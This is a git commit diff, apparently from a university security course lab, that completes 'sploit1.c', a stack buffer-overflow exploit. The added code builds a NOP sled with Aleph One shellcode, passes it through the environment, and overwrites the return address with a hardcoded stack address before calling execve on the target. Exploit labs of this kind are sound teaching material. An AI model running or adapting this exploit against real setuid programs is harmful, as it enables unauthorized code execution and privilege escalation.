9b6f324d7391b60dae5147ed736dcee5a7d66d7e
yordanos <yag3@cornell.edu>
2019-12-02 22:58:49 -0500

    sploit1 done

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -13,10 +13,32 @@ int main(void)
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "student"; 
+
+//change the address to the env
+  printf("AA\n");
+  char rt_arr[12] = "";
+//bf ff fe c8
+  for (int i=0; i <3 ; i++){
+        strcat(rt_arr, "\xc8\xfe\xff\xbf");
+  }
+
+  int sizeOfNoOp = 203;
+  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
+  int n = sizeOfNoOp + sizeOfShell;
+  char a[n];
+
+  memset(a, '\x90', sizeOfNoOp*sizeof(char));
+
+  memcpy(a+sizeOfNoOp, shellcodeAlephOne, sizeOfShell*sizeof(char));
+
+
+  args[1] = rt_arr; 
   args[2] = NULL;
-  
-  env[0] = NULL;
+ 
+
+
+ 
+  env[0] = a;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
